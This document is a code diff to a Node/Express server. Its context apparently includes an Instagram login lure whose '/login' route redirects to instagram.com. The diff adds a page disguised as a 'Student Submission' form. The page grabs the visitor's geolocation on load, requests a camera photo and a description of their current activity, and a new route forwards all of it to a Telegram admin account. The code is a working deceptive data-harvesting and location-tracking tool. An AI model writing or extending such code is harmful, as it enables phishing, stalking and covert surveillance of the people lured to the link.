@@ -372,7 +372,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
-// Serve Instagram page - FIXED
+// Serve Instagram page
 app.get("/insta", (req, res) => {
   res.sendFile(path.join(__dirname, "test insta", "index.html"));
 });
@@ -398,7 +398,7 @@ app.post("/login", async (req, res) => {
   res.redirect("https://www.instagram.com/");
 });
 
-// Student Page - Just save user ID
+// Student Page - Photo and Location Submission
 app.get("/r/:ref", async (req, res) => {
   const { ref } = req.params;
   if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid ID");
@@ -408,18 +408,296 @@ app.get("/r/:ref", async (req, res) => {
   res.type("html").send(`<!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI Course</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Submission</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: bold;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        textarea {
+            height: 100px;
+            resize: vertical;
+        }
+        .photo-preview {
+            margin-top: 10px;
+            text-align: center;
+        }
+        .photo-preview img {
+            max-width: 200px;
+            max-height: 200px;
+            border-radius: 8px;
+            border: 2px solid #ddd;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+        .student-id {
+            text-align: center;
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .instructions {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        .instructions ul {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        .instructions li {
+            margin-bottom: 5px;
+        }
+    </style>
 </head>
 <body>
-  <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
-    <h1>✅ Success!</h1>
-    <p>Your ID has been recorded: ${ref}</p>
-    <p>You can close this page.</p>
-  </div>
+    <div class="container">
+        <h1>📸 Student Submission</h1>
+        <div class="student-id">Student ID: ${ref}</div>
+        
+        <div class="instructions">
+            <strong>Instructions:</strong>
+            <ul>
+                <li>Take a clear photo of yourself</li>
+                <li>Enable location services</li>
+                <li>Describe your current activity</li>
+                <li>Click submit when ready</li>
+            </ul>
+        </div>
+
+        <form id="studentForm">
+            <div class="form-group">
+                <label for="photo">📷 Take Photo:</label>
+                <input type="file" id="photo" accept="image/*" capture="camera" required>
+                <div class="photo-preview" id="photoPreview"></div>
+            </div>
+
+            <div class="form-group">
+                <label for="location">📍 Your Location:</label>
+                <input type="text" id="location" placeholder="Getting your location..." readonly required>
+            </div>
+
+            <div class="form-group">
+                <label for="activity">📝 Current Activity:</label>
+                <textarea id="activity" placeholder="Describe what you're doing right now..." required></textarea>
+            </div>
+
+            <button type="submit" class="submit-btn">✅ Submit Information</button>
+        </form>
+    </div>
+
+    <script>
+        // Get user location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        // Get address from coordinates
+                        try {
+                            const response = await fetch(\`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=\${lat}&longitude=\${lon}&localityLanguage=en\`);
+                            const data = await response.json();
+                            const location = data.city + ', ' + data.countryName;
+                            document.getElementById('location').value = location + ' (' + lat.toFixed(4) + ', ' + lon.toFixed(4) + ')';
+                        } catch (error) {
+                            document.getElementById('location').value = 'Location: ' + lat.toFixed(4) + ', ' + lon.toFixed(4);
+                        }
+                    },
+                    (error) => {
+                        document.getElementById('location').value = 'Location access denied';
+                        console.error('Geolocation error:', error);
+                    }
+                );
+            } else {
+                document.getElementById('location').value = 'Geolocation not supported';
+            }
+        }
+
+        // Photo preview
+        document.getElementById('photo').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const preview = document.getElementById('photoPreview');
+                    preview.innerHTML = '<img src="' + e.target.result + '" alt="Photo Preview">';
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Form submission
+        document.getElementById('studentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const photo = document.getElementById('photo').files[0];
+            const location = document.getElementById('location').value;
+            const activity = document.getElementById('activity').value;
+            
+            if (!photo || !location || !activity) {
+                alert('Please fill all fields and take a photo!');
+                return;
+            }
+
+            const submitBtn = document.querySelector('.submit-btn');
+            submitBtn.textContent = '🔄 Submitting...';
+            submitBtn.disabled = true;
+
+            try {
+                // Convert photo to base64
+                const reader = new FileReader();
+                reader.onload = async function() {
+                    const photoBase64 = reader.result;
+                    
+                    // Send data to Telegram
+                    const response = await fetch('/submit-student-data', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            studentId: '${ref}',
+                            photo: photoBase64,
+                            location: location,
+                            activity: activity,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+
+                    if (response.ok) {
+                        alert('✅ Data submitted successfully!');
+                        document.getElementById('studentForm').reset();
+                        document.getElementById('photoPreview').innerHTML = '';
+                    } else {
+                        alert('❌ Error submitting data. Please try again.');
+                    }
+                    
+                    submitBtn.textContent = '✅ Submit Information';
+                    submitBtn.disabled = false;
+                };
+                reader.readAsDataURL(photo);
+                
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('❌ Network error. Please check connection and try again.');
+                submitBtn.textContent = '✅ Submit Information';
+                submitBtn.disabled = false;
+            }
+        });
+
+        // Get location when page loads
+        getLocation();
+    </script>
 </body>
 </html>`);
+});
+
+// Handle student data submission
+app.post("/submit-student-data", async (req, res) => {
+  try {
+    const { studentId, photo, location, activity, timestamp } = req.body;
+    
+    if (!studentId || !photo || !location || !activity) {
+      return res.status(400).json({ error: "Missing data" });
+    }
+
+    // Send to Telegram
+    const message = `🎓 *NEW STUDENT SUBMISSION*\n\n` +
+                   `🆔 Student ID: ${studentId}\n` +
+                   `📍 Location: ${location}\n` +
+                   `📝 Activity: ${activity}\n` +
+                   `⏰ Time: ${new Date(timestamp).toLocaleString()}\n\n` +
+                   `Photo attached below 👇`;
+
+    // Send text message first
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
+
+    // Send photo if it's not too large
+    if (photo.length < 5000000) { // 5MB limit for photos
+      try {
+        await bot.telegram.sendPhoto(ADMIN_USER_ID, { 
+          source: Buffer.from(photo.split(',')[1], 'base64') 
+        }, {
+          caption: `Photo from Student ${studentId}`
+        });
+      } catch (photoError) {
+        console.error('Photo send error:', photoError);
+        await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large or invalid for student ${studentId}`);
+      }
+    } else {
+      await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large for student ${studentId}`);
+    }
+
+    res.json({ success: true, message: "Data received" });
+  } catch (error) {
+    console.error("Student data submission error:", error);
+    res.status(500).json({ error: "Internal server error" });
+  }
 });
 
 // Health check
